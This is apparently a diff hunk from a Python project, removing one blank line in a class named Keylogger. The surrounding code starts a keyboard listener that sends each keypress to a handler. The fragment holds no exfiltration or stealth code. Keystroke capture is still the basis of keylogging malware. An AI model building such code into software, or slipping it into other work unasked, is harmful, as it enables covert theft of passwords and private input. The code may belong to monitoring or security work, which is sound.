@@ -22,7 +22,6 @@ class Keylogger(KeyloggerBase):
         }
         self.log_handler = LogHandler()
 
-
     def start_listener(self):
         with Listener(on_press=self._on_key_press) as listener:
             listener.join()
